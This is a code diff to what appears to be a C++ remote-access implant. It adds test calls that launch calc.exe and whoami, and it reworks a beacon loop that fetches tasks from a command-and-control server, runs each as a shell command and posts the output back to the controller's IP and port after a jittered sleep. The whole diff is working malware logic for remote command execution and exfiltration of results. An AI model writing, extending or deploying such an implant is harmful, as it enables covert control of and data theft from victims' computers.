@@ -61,6 +61,8 @@ int main() {
     //vector to hold tasks to execute
     std::vector<std::string> tasks;
     std::vector<std::string> results;
+    std::cout << shell("calc.exe") << "\n";
+    std::cout << shell("whoami");
 
     while (true) {
         int jitter = getRandom(-2500, 5000);
@@ -84,17 +86,15 @@ int main() {
             for(std::string const& i : tasks){
                 if(i != implant_id){
                     std::string result {shell(i)};
-                    results.push_back(i);
+                    std::string postresult = std::format("{},,{}", implant_id, result);
+                    post(fern.getIP(),fern.getPort(), RESULTS, postresult);
+                    Sleep(500);
                 }
             }
 
-            //Sending results
-            for(int i = 0;  i <= results.size(); i+=2){
-                std::string postresult {std::format("{},,{}", results[i],results[i+1])};
-                post(ip,port, RESULTS, postresult);
-            }
 
             Sleep(fern.getSleep() + jitter);
         }
     }
+
 }
